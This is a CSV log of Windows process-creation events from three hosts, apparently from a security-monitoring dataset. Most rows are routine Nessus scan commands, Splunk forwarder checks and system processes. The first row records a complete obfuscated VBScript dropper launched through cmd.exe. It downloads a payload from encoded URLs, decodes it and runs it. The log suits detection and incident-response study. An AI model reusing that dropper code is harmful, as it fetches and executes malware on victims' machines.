host,CommandLine,EventCode
we8105desk,"cmd.exe /V /C set ""GSI=%APPDATA%\%RANDOM%.vbs"" &amp;&amp; (for %i in (""DIm RWRL"" ""FuNCtioN GNbiPp(Pt5SZ1)"" ""EYnt=45"" ""GNbiPp=AsC(Pt5SZ1)"" ""Xn1=52"" ""eNd fuNCtiON"" ""SUb OjrYyD9()"" ""J0Nepq=56"" ""Dim UJv,G4coQ"" ""LT=23"" ""dO WHiLE UJv&lt;&gt;3016-3015"" ""G4coQ=G4coQ+1"" ""WSCRiPt.sLEeP(11)"" ""LoOP"" ""UsZK0=85"" ""ENd suB"" ""fuNctIon J7(BLI4A3)"" ""K5AU=29"" ""J7=cHR(BLI4A3)"" ""XBNutM9=36"" ""eNd fuNCtiON"" ""SUb MA(QrG)"" ""WXCzRz=9"" ""Dim Jw"" ""Qt7=34"" ""Jw=TIMeR+QrG"" ""Do WhiLE tIMEr&lt;Jw"" ""WSCRipT.sleEP(6)"" ""LOOp"" ""EXdkRkH=78"" ""enD sUB"" ""fUnCTion M1p67jL(BwqIM7,Qa)"" ""Yi=80"" ""dIM KH,ChnFY,RX,Pg,C6YT(8)"" ""Cm=7"" ""C6YT(1)=107"" ""Rzf=58"" ""C6YT(5)=115"" ""BSKoW=10"" ""C6YT(4)=56"" ""Cwd6=35"" ""C6YT(7)=110"" ""AQ=98"" ""C6YT(6)=100"" ""Y6Cm1I=82"" ""C6YT(2)=103"" ""JH3F2i=74"" ""C6YT(8)=119"" ""JRvsG2s=76"" ""C6YT(3)=53"" ""Yh=31"" ""C6YT(0)=115"" ""GuvD=47"" ""Tbvf1=67"" ""SeT KH=cReATeObject(A9y(""3C3A1D301F2D063708772930033C3C201C2D0A34203B053C0C2D"", ""Yo""))"" ""V2JR=73"" ""Set ChnFY=KH.GETfilE(BwqIM7)"" ""RGeJ=68"" ""SeT Pg=ChnFY.opEnASTExTstReAM(6806-6805,7273-7273)"" ""CtxOk=82"" ""seT RX=KH.cREateteXtFiLe(Qa,6566-6565,2508-2508)"" ""XPL9af=76"" ""Do uNtil Pg.aTEnDOfStReam"" ""RX.wRitE J7(OyVNo(GNbiPp(Pg.rEAD(6633-6632)),C6YT(0)))"" ""LooP"" ""IQz=49"" ""RX.cloSe"" ""CBR1gC7=51"" ""Pg.cLOSE"" ""PmG=64"" ""eNd funCTIOn"" ""FUNcTION Ql9zEF()"" ""IBL2=16"" ""Ql9zEF=secoND(Time)"" ""MUTkPNJ=41"" ""End FUNcTiOn"" ""FUnCtion A9y(Am,T1GCbB)"" ""CWCH9r=82"" ""Dim V3sl0m,F4ra,AxFE"" ""RLLp8R=89"" ""For V3sl0m=1 To (lEn(Am)/2)"" ""F4ra=(J7((8270-8232)) &amp; J7((5328/74))&amp;(miD(Am,(V3sl0m+V3sl0m)-1,2)))"" ""AxFE=(GNbiPp(mID(T1GCbB,((V3sl0m MOd Len(T1GCbB))+1),1)))"" ""A9y=A9y+J7(OyVNo(F4ra,AxFE))"" ""NeXT"" ""DxZ40=89"" ""enD fUNction"" ""Sub AylniN()"" ""N6nzb=92"" ""DIm GWJCk,Q3y,GKasG0"" ""FDu=47"" ""GWJCk=93961822"" ""UZ=32"" ""FoR Q3y=1 To GWJCk"" ""GKasG0=GKasG0+1"" ""neXt"" ""B1jq2Hk=63"" ""If GKasG0=GWJCk tHen"" ""KXso=18"" ""MA((-176+446))"" ""IP4=48"" ""Yq(A9y(""0B3B1D44626E7E1020055D3C20230A3B0C503D31230C3700593135344D201B53772C39173D475E2826"",""QcOi4XA""))"" ""YTsWy=31"" ""elSe"" ""DO5gpmA=84"" ""A8=86"" ""EnD iF"" ""XyUP=64"" ""eND SuB"" ""sUB GKfD3aY(FaddNPJ)"" ""SDU0BLq=57"" ""DiM UPhqZ,KbcT"" ""DxejPK=88"" ""KbcT=""Drn4AW"""" ""GROlc7=82"" ""sET UPhqZ=CREAteOBJecT(A9y(""332A7B05156A211A46243629"",KbcT))"" ""Gs0g=3"" ""UPhqZ.OpEn"" ""TF1=68"" ""UPhqZ.tyPE=6867-6866"" ""RDjmY=24"" ""UPhqZ.wrITe FaddNPJ"" ""WiFgvS=78"" ""UPhqZ.SaVeTOfIle RWRL,8725-8723"" ""AF=4"" ""UPhqZ.closE"" ""JC7sf2=1"" ""Cke4e"" ""JM=88"" ""EnD suB"" ""fuNCtIoN Yq(PDqi1)"" ""I0=22"" ""DiM YTwwO,BAU7Cz,Uv,JiYwVG,IK"" ""GJDnbE=32"" ""On ErrOR reSume NeXT"" ""B7bT=1"" ""Uv=""Tk"""" ""ELw=73"" ""sEt YTwwO=CREaTeObjeCT(A9y(""3C07082602241F7A383C0E3807"",Uv))"" ""K4=62"" ""GAiF"" ""IS1cj=19"" ""Set Dzc0=YTwwO.eNVIrONMEnt(A9y(""013B183400023A"",""EQiWw""))"" ""D9S=38"" ""RWRL=Dzc0(A9y(""14630811720C14"",""XU3""))&amp;J7((8002-7910))&amp; Ql9zEF &amp; Ql9zEF"" ""AtCQ=95"" ""JiYwVG=""FcQqQ"""" ""Tf=79"" ""sEt BAU7Cz=CrEATEoBjECT(A9y(""2E38122329103E1725683B1C3D19123701"",JiYwVG))"" ""QUY=56"" ""BAU7Cz.OpeN A9y(""0D0E1E"",""KJ""),PDqi1,7387-7387"" ""JX2=58"" ""BAU7Cz.SeTReQuEstHeAdeR A9y(""1F59242828"",""OM8J""),A9y(""0D354C3D356B567A0F6B6B"",""VoL8XF"")"" ""URkT=71"" ""BAU7Cz.SEnD()"" ""QdFeA6=65"" ""if BAU7Cz.StaTUstExt=A9y(""652840353A542512023C5B3D572F27"",""S5I2A"") then"" ""PwTLW23=36"" ""GAiF"" ""R4xYBS=63"" ""MA(4)"" ""PjL6m=46"" ""GKfD3aY BAU7Cz.ReSpONSEbody"" ""Fj98=72"" ""Else"" ""D7T=91"" ""IK=""NNXFD0"""" ""NK=74"" ""SeT BAU7Cz= CreATeobJECT(A9y(""033125365F3D213E326A68030210121060"",IK))"" ""QJ=35"" ""BAU7Cz.oPeN A9y(""2A2F0E"",""TmjZ8d""),A9y(""07351B31556E40785D6F5D735D6F5E715B6F5E795D6E02291B33412B1F26"",""Ao"" ),5022-5022"" ""UMp8=85"" ""BAU7Cz.SeTReqUesTheadER A9y(""1439190A24"",""AFXwm""),A9y(""371038301A716C5F7B6644"",""LUi"")"" ""NluUc=93"" ""BAU7Cz.SENd()"" ""EOtR=44"" ""If BAU7Cz.STaTUSTexT=A9y(""03510A3B3A51146F105F163B365E0C"",""OS0x"") THen GKfD3aY BAU7Cz.REsPOnSeBODY"" ""Q6sMEZ=54"" ""I9Nl7=56"" ""end if"" ""Dq=54"" ""eND FuNCTioN"" ""fUNctIon OyVNo(U1,Brt0d)"" ""SNOW=59"" ""OyVNo=(U1 ANd noT Brt0d)oR(NOt U1 And Brt0d)"" ""QTi5K=54"" ""enD funcTION"" ""Sub Cke4e()"" ""WTOyAw=62"" ""dIM EuM,WIbud,NCiN,Fs8HJ"" ""A5AT=92"" ""NCiN="""""""""" ""SX6=93"" ""WIbud=RWRL &amp; Ql9zEF &amp; A9y(""4A330F3F"",""WdGbOGp"")"" ""V5B7Zh=92"" ""M1p67jL RWRL,WIbud"" ""L13=45"" ""iF Fs8HJ="""" tHen MA(4)"" ""CHaK=38"" ""EuM=""Iqxkf"""" ""U56m=67"" ""SEt VP=creATeoBJEcT(A9y(""262B081420010C453521141407"",EuM))"" ""U5Quw=85"" ""VP.Run A9y(""1023287B163629755C0D6C06270F1E01536C6E7551"",""UsNL"") &amp; WIbud &amp; NCiN,2912-2912,5755-5755"" ""A6mfcYL=76"" ""End sUB"" ""JoxZ3=43"" ""AylniN"" ""suB GAiF()"" ""G4vzM=95"" ""Dim DCRml9g, CjoNOY9"" ""For DCRml9g = 68 To 6000327"" ""CjoNOY9 = Rvwr + 23 + 35 + 27"" ""Next"" ""KK0H=46"" ""enD sUb"") do @echo %~i)&gt;""!GSI!"" &amp;&amp; start """" ""!GSI!""",1
we8105desk,"C:\Windows\SysWOW64\DllHost.exe /Processid:{1EF75F33-893B-4E8F-9655-C3D602BA4897}",1
we8105desk,"wmiadap.exe /R /T",1
we8105desk,"""C:\Program Files\Common Files\Microsoft Shared\OfficeSoftwareProtectionPlatform\OSPPSVC.EXE""",1
we8105desk,"""C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE"" /n /f ""D:\Miranda_Tate_unveiled.dotm""",1
we8105desk,"C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",1
we8105desk,"C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",1
we8105desk,"C:\Windows\SysWOW64\DllHost.exe /Processid:{1EF75F33-893B-4E8F-9655-C3D602BA4897}",1
we8105desk,"""C:\Windows\explorer.exe""",1
we8105desk,"C:\Windows\system32\AUDIODG.EXE 0x8b8",1
we9041srv,"""dwm.exe""",1
we9041srv,"""LogonUI.exe"" /flags:0x0",1
we9041srv,"winlogon.exe",1
we9041srv,"%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16",1
we9041srv,"\SystemRoot\System32\smss.exe 00000000 00000050",1
we8105desk,"choice  /T 1 /C X /D X /N",1
we8105desk,"\??\C:\Windows\system32\conhost.exe",1
we8105desk,"cmd /c C:\Windows\temp\nessus_W7GLH62C.bat",1
we1149srv,"""dwm.exe""",1
we1149srv,"""LogonUI.exe"" /flags:0x0",1
we1149srv,"winlogon.exe",1
we1149srv,"%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16",1
we1149srv,"\SystemRoot\System32\smss.exe 00000000 00000050",1
we8105desk,"""C:\Windows\system32\SearchFilterHost.exe"" 0 524 528 536 65536 532",1
we8105desk,"C:\Windows\tenable_mw_scan_142a90001fb65e0beb1751cc8c63edd0.exe",1
we8105desk,"\??\C:\Windows\system32\conhost.exe",1
we8105desk,"sc start tenable_mw_scan type=1 output=nessus_SFBBT7QA.txt",1
we9041srv,"choice  /T 1 /C X /D X /N",1
we9041srv,"\??\C:\Windows\system32\conhost.exe 0xffffffff",1
we9041srv,"cmd /c C:\Windows\temp\nessus_ZCHPYH15.bat",1
we8105desk,"schtasks  /query /XML",1
we8105desk,"\??\C:\Windows\system32\conhost.exe",1
we8105desk,"cmd /c ""schtasks /query /XML &gt; %SystemRoot%\TEMP\nessus_VPG2T4UF.TMP &amp; ren %SystemRoot%\TEMP\nessus_VPG2T4UF.TMP nessus_VPG2T4UF.TXT""",1
we9041srv,"C:\Windows\tenable_mw_scan_142a90001fb65e0beb1751cc8c63edd0.exe",1
we9041srv,"\??\C:\Windows\system32\conhost.exe 0xffffffff",1
we9041srv,"sc start tenable_mw_scan type=1 output=nessus_QYVJLVDT.txt",1
we1149srv,"C:\Windows\system32\wbem\wmiprvse.exe -Embedding",1
we1149srv,"C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding",1
we9041srv,"C:\Windows\system32\wbem\wmiprvse.exe -Embedding",1
we8105desk,"netsh  advfirewall show allprofiles firewallpolicy",1
we8105desk,"cmd  /c netsh advfirewall show allprofiles firewallpolicy",1
we8105desk,"netsh  advfirewall firewall show rule name=all verbose",1
we8105desk,"\??\C:\Windows\system32\conhost.exe",1
we8105desk,"cmd /c netsh advfirewall firewall show rule name=all verbose &gt; %SystemRoot%\TEMP\nessus_OCREA4YZ.TMP &amp; cmd /c netsh advfirewall show allprofiles firewallpolicy &gt;&gt; %SystemRoot%\TEMP\nessus_OCREA4YZ.TMP &amp; move %SystemRoot%\TEMP\nessus_OCREA4YZ.TMP %SystemRoot%\TEMP\nessus_OCREA4YZ.TXT",1
we9041srv,"schtasks  /query /XML",1
we9041srv,"\??\C:\Windows\system32\conhost.exe 0xffffffff",1
we9041srv,"cmd /c ""schtasks /query /XML &gt; %SystemRoot%\TEMP\nessus_W426FMMY.TMP &amp; ren %SystemRoot%\TEMP\nessus_W426FMMY.TMP nessus_W426FMMY.TXT""",1
we8105desk,"tasklist  /svc",1
we8105desk,"\??\C:\Windows\system32\conhost.exe",1
we8105desk,"cmd /c ""tasklist /svc &gt; %SystemRoot%\TEMP\nessus_task_listY42QJDIQ.TMP &amp; ren %SystemRoot%\TEMP\nessus_task_listY42QJDIQ.TMP nessus_task_listY42QJDIQ.TXT""",1
we9041srv,"C:\Windows\system32\svchost.exe -k wsappx",1
we9041srv,"powershell  ""Get-AppxPackage -AllUsers | select name, version, architecture, publisher | Format-List | out-string -width 4096""",1
we9041srv,"\??\C:\Windows\system32\conhost.exe 0xffffffff",1
we9041srv,"cmd /c powershell ""Get-AppxPackage -AllUsers | select name, version, architecture, publisher | Format-List | out-string -width 4096"" &gt; %SystemRoot%\TEMP\nessus_R3OP3JQV.TMP &amp; move %SystemRoot%\TEMP\nessus_R3OP3JQV.TMP %SystemRoot%\TEMP\nessus_R3OP3JQV.TXT",1
we9041srv,"netsh  advfirewall show allprofiles firewallpolicy",1
we9041srv,"cmd  /c netsh advfirewall show allprofiles firewallpolicy",1
we9041srv,"netsh  advfirewall firewall show rule name=all verbose",1
we9041srv,"\??\C:\Windows\system32\conhost.exe 0xffffffff",1
we9041srv,"cmd /c netsh advfirewall firewall show rule name=all verbose &gt; %SystemRoot%\TEMP\nessus_SV9VMSPT.TMP &amp; cmd /c netsh advfirewall show allprofiles firewallpolicy &gt;&gt; %SystemRoot%\TEMP\nessus_SV9VMSPT.TMP &amp; move %SystemRoot%\TEMP\nessus_SV9VMSPT.TMP %SystemRoot%\TEMP\nessus_SV9VMSPT.TXT",1
we8105desk,"C:\Windows\system32\wbem\wmiprvse.exe -Embedding",1
we8105desk,"C:\Windows\system32\svchost.exe -k regsvc",1
we8105desk,"netsh  wlan show interface",1
we8105desk,"\??\C:\Windows\system32\conhost.exe",1
we8105desk,"cmd /c netsh wlan show interface &gt; %SystemRoot%\TEMP\nessus_IQK9FYH1.TMP &amp; move %SystemRoot%\TEMP\nessus_IQK9FYH1.TMP %SystemRoot%\TEMP\nessus_IQK9FYH1.TXT",1
we8105desk,"C:\Windows\servicing\TrustedInstaller.exe",1
we8105desk,"netstat  -ano",1
we8105desk,"""C:\Windows\system32\SearchFilterHost.exe"" 0 524 528 536 65536 532",1
we8105desk,"\??\C:\Windows\system32\conhost.exe",1
we8105desk,"""C:\Windows\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe7_ Global\UsGthrCtrlFltPipeMssGthrPipe7 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon""",1
we8105desk,"cmd /c ""netstat -ano &gt; %SystemRoot%\TEMP\nessus_4UC962OK.TMP &amp; ren %SystemRoot%\TEMP\nessus_4UC962OK.TMP nessus_4UC962OK.TXT""",1
we8105desk,"C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding",1
we1149srv,"c:\windows\system32\inetsrv\w3wp.exe -ap ""DefaultAppPool"" -v ""v4.0"" -l ""webengine4.dll"" -a \\.\pipe\iisipm45a13fae-8ca5-408b-a9e4-631fc0631086 -h ""C:\inetpub\temp\apppools\DefaultAppPool\DefaultAppPool.config"" -w """" -m 0 -t 20 -ta 0",1
we9041srv,"tasklist  /svc",1
we9041srv,"\??\C:\Windows\system32\conhost.exe 0xffffffff",1
we9041srv,"cmd /c ""tasklist /svc &gt; %SystemRoot%\TEMP\nessus_task_listI8RC8S8K.TMP &amp; ren %SystemRoot%\TEMP\nessus_task_listI8RC8S8K.TMP nessus_task_listI8RC8S8K.TXT""",1
we9041srv,"C:\Windows\system32\wbem\wmiprvse.exe -Embedding",1
we9041srv,"netsh  wlan show interface",1
we9041srv,"\??\C:\Windows\system32\conhost.exe 0xffffffff",1
we9041srv,"cmd /c netsh wlan show interface &gt; %SystemRoot%\TEMP\nessus_JMJL39S5.TMP &amp; move %SystemRoot%\TEMP\nessus_JMJL39S5.TMP %SystemRoot%\TEMP\nessus_JMJL39S5.TXT",1
we9041srv,"C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_6.3.9600.16384_none_fa1dc1539b4180d8\TiWorker.exe -Embedding",1
we9041srv,"C:\Windows\servicing\TrustedInstaller.exe",1
we9041srv,"C:\Windows\system32\sppsvc.exe",1
we9041srv,"netstat  -ano",1
we9041srv,"\??\C:\Windows\system32\conhost.exe 0xffffffff",1
we9041srv,"cmd /c ""netstat -ano &gt; %SystemRoot%\TEMP\nessus_4LX6EPAV.TMP &amp; ren %SystemRoot%\TEMP\nessus_4LX6EPAV.TMP nessus_4LX6EPAV.TXT""",1
we9041srv,"C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding",1
we9041srv,"C:\Windows\system32\wbem\wmiprvse.exe -Embedding",1
we9041srv,"C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding",1
we1149srv,"C:\Windows\system32\wbem\wmiprvse.exe -Embedding",1
we1149srv,"C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding",1
we8105desk,"C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding",1
we8105desk,"C:\Windows\System32\rundll32.exe shell32.dll,SHCreateLocalServerRunDll {995C996E-D918-4a8c-A302-45719A6F4EA7} -Embedding",1
we8105desk,"C:\Windows\system32\wermgr.exe -queuereporting",1
we8105desk,"""C:\Windows\system32\SearchFilterHost.exe"" 0 524 528 536 65536 532",1
we8105desk,"""C:\Windows\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe6_ Global\UsGthrCtrlFltPipeMssGthrPipe6 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon""",1
we8105desk,"""C:\Windows\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe_S-1-5-21-67332772-3493699611-3403467266-11095_ Global\UsGthrCtrlFltPipeMssGthrPipe_S-1-5-21-67332772-3493699611-3403467266-11095 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon""  ""1""",1
we8105desk,"""C:\Windows\system32\SearchFilterHost.exe"" 0 524 528 536 65536 532",1
we8105desk,"""C:\Windows\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe_S-1-5-21-67332772-3493699611-3403467266-11094_ Global\UsGthrCtrlFltPipeMssGthrPipe_S-1-5-21-67332772-3493699611-3403467266-11094 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon""  ""1""",1
we8105desk,"""C:\Windows\system32\SearchFilterHost.exe"" 0 524 528 536 65536 532",1
we8105desk,"""C:\Windows\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe3_ Global\UsGthrCtrlFltPipeMssGthrPipe3 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon""",1
we8105desk,"""C:\Windows\system32\SearchFilterHost.exe"" 0 524 528 536 65536 532",1
we8105desk,"wmiadap.exe /F /T /R",1
we8105desk,"C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding",1
we8105desk,"taskhost.exe $(Arg0)",1
we8105desk,"C:\Windows\System32\sdclt.exe /CONFIGNOTIFICATION",1
we8105desk,"""C:\Program Files (x86)\Common Files\Acronis\SyncAgent\syncagentsrv.exe""",1
we8105desk,"C:\Windows\system32\sppsvc.exe",1
we8105desk,"""C:\Program Files (x86)\Intel\Intel(R) Management Engine Components\LMS\LMS.exe""",1
we8105desk,"""C:\Windows\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe_S-1-5-21-67332772-3493699611-3403467266-11092_ Global\UsGthrCtrlFltPipeMssGthrPipe_S-1-5-21-67332772-3493699611-3403467266-11092 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon""  ""1""",1
we8105desk,"""C:\Windows\system32\SearchFilterHost.exe"" 0 524 528 536 65536 532",1
we8105desk,"""C:\Windows\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe1_ Global\UsGthrCtrlFltPipeMssGthrPipe1 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon""",1
we8105desk,"C:\Windows\system32\SearchIndexer.exe /Embedding",1
we8105desk,"C:\Windows\system32\SearchIndexer.exe /Embedding",1
we8105desk,"""C:\Program Files (x86)\Microsoft Office\Office14\BCSSync.exe"" /DelayServices",1
we8105desk,"""C:\Program Files (x86)\Acronis\TrueImageHome\TrueImageMonitor.exe""",1
we8105desk,"""C:\Program Files (x86)\Common Files\Acronis\TibMounter\TibMounterMonitor.exe""",1
we8105desk,"""C:\Program Files (x86)\Intel\Intel(R) USB 3.0 eXtensible Host Controller Driver\Application\iusb3mon.exe""",1
we8105desk,"""C:\Program Files (x86)\Intel\Intel(R) Integrated Clock Controller Service\ICCProxy.exe""",1
we8105desk,"C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",1
we8105desk,"C:\Windows\SysWOW64\DllHost.exe /Processid:{1EF75F33-893B-4E8F-9655-C3D602BA4897}",1
we8105desk,"C:\Windows\SysWOW64\runonce.exe /Run6432",1
we8105desk,"""C:\Program Files (x86)\Common Files\Acronis\Schedule2\schedhlp.exe""",1
we8105desk,"""C:\Program Files\Boot Camp\Bootcamp.exe""",1
we8105desk,"""C:\Windows\System32\igfxpers.exe""",1
we8105desk,"""C:\Windows\System32\hkcmd.exe""",1
we8105desk,"""C:\Windows\system32\igfxsrvc.exe"" -Embedding",1
we8105desk,"""C:\Windows\System32\igfxtray.exe""",1
we8105desk,"C:\Windows\Explorer.EXE",1
we8105desk,"""C:\Windows\system32\Dwm.exe""",1
we8105desk,"C:\Windows\system32\userinit.exe",1
we8105desk,"""taskhost.exe""",1
we8105desk,"C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}",1
we8105desk,"C:\Windows\System32\svchost.exe -k secsvcs",1
we8105desk,"taskhost.exe SYSTEM",1
we8105desk,"""C:\Windows\system32\WUDFHost.exe"" -HostGUID:{193a1820-d9ac-4997-8c55-be817523f6aa} -IoEventPortName:HostProcess-ac6024c6-0e8e-4905-9442-280600567282 -SystemEventPortName:HostProcess-47fb5318-ca0f-44a7-866d-cf286eabcb42 -IoCancelEventPortName:HostProcess-73811b94-bc88-4562-beac-f050c8c2e1ab -NonStateChangingEventPortName:HostProcess-487fce22-2fcf-4925-8557-9c32d3729e3e -ServiceSID:S-1-5-80-2652678385-582572993-1835434367-1344795993-749280709 -LifetimeId:9e02b3ab-0d2b-4e15-8682-744712c1ca2e",1
we8105desk,"C:\Windows\system32\svchost.exe -k bthsvcs",1
we8105desk,"C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation",1
we8105desk,"C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted",1
we8105desk,"cmd /c """"C:\Program Files\SplunkUniversalForwarder\etc\system\bin\powershell2.cmd"" --scheme""",1
we8105desk,"cmd /c """"C:\Program Files\SplunkUniversalForwarder\etc\system\bin\powershell.cmd"" --scheme""",1
we8105desk,"cmd /c """"C:\Program Files\SplunkUniversalForwarder\etc\system\bin\perfmon.cmd"" --scheme""",1
we8105desk,"cmd /c """"C:\Program Files\SplunkUniversalForwarder\etc\system\bin\admon.cmd"" --scheme""",1
we8105desk,"cmd /c """"C:\Program Files\SplunkUniversalForwarder\etc\system\bin\WinRegMon.cmd"" --scheme""",1
we8105desk,"cmd /c """"C:\Program Files\SplunkUniversalForwarder\etc\system\bin\WinPrintMon.cmd"" --scheme""",1
we8105desk,"cmd /c """"C:\Program Files\SplunkUniversalForwarder\etc\system\bin\WinNetMon.cmd"" --scheme""",1
we8105desk,"cmd /c """"C:\Program Files\SplunkUniversalForwarder\etc\system\bin\WinHostMon.cmd"" --scheme""",1
we8105desk,"cmd /c """"C:\Program Files\SplunkUniversalForwarder\etc\system\bin\WinEventLog.cmd"" --scheme""",1
we8105desk,"cmd /c """"C:\Program Files\SplunkUniversalForwarder\etc\system\bin\MonitorNoHandle.cmd"" --scheme""",1
we8105desk,"C:\Windows\system32\cmd.exe /c ""C:\Program Files\SplunkUniversalForwarder\bin\splunk.exe"" _internal check-xml-files --answer-yes --no-prompt 2&gt;&amp;1",1
we8105desk,"C:\Windows\system32\cmd.exe /c btool server list general --no-log",1
we8105desk,"C:\Windows\system32\cmd.exe /c btool server list replication_port --no-log",1
we8105desk,"cscript.exe /nologo C:\Windows\TEMP\E5548D7D-7D5D-4693-A892-94129A925C26.vbs",1
we8105desk,"cscript.exe /nologo C:\Windows\TEMP\A1985133-B0BB-4771-9B34-54C1DC493370.vbs",1
we8105desk,"C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding",1
we8105desk,"C:\Windows\sysWOW64\wbem\wmiprvse.exe -secured -Embedding",1
we8105desk,"cscript.exe /nologo C:\Windows\TEMP\5F336C48-BD3F-46AF-8FB1-E076BA7329CB.vbs",1
we8105desk,"C:\Windows\system32\cmd.exe /c ""C:\Program Files\SplunkUniversalForwarder\bin\splunk.exe"" _internal pre-flight-checks --answer-yes --no-prompt 2&gt;&amp;1",1
we8105desk,"C:\Windows\system32\wbem\wmiprvse.exe -Embedding",1
we8105desk,"C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding",1
we8105desk,"C:\Windows\system32\cmd.exe /c btool server list kvstore --no-log",1
we8105desk,"C:\Windows\system32\cmd.exe /c btool server list general --no-log",1
we8105desk,"C:\Windows\system32\cmd.exe /c btool web list settings --no-log",1
we8105desk,"C:\Windows\Sysmon.exe",1
we8105desk,"C:\Windows\system32\cmd.exe /c ""C:\Program Files\SplunkUniversalForwarder\bin\splunk.exe"" _internal_extra_splunkd_service_args",1
we8105desk,"\??\C:\Windows\system32\conhost.exe",1
we8105desk,"\??\C:\Windows\system32\conhost.exe",1
we8105desk,"C:\Windows\system32\cmd.exe /c ""C:\Program Files\SplunkUniversalForwarder\bin\splunk.exe"" _RAW_envvars",1
we8105desk,"""C:\Program Files (x86)\Common Files\Acronis\Infrastructure\mms_mini.exe""",1
we8105desk,"C:\Windows\system32\AppleTimeSrv.exe",1
we8105desk,"C:\Windows\system32\AppleOSSMgr.exe",1
we8105desk,"""C:\Program Files (x86)\Common Files\Acronis\CDP\afcdpsrv.exe""",1
